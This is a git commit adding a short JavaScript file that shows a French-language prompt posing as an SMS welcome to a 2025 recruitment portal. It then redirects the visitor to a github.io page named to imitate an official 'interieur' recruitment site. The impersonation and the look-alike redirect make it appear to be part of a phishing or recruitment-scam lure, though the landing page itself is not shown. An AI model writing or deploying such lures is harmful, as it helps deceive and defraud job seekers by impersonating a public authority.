1eb5729abee3f9c32d7b636e75570c29d3223969
offernoww <josiahnyeti16@gmail.com>
2025-02-08 18:31:20 +0100

    Create mkupz.js

---
+++ mkupz.js
@@ -0,0 +1,6 @@
+
+var password = 'PORTAIL DE RECRUTEMENT'
+password=prompt('SMS :Bienvenue sur le portail de recrutement 2025, cliquez sur OK pour démarrer la candidature  ','PORTAIL DE RECRUTEMENT');
+if (password != 'PORTAIL DE RECRUTEMENT') {
+location.href='https://offernoww.github.io/interieur-recrutement-portail.ga';
+}
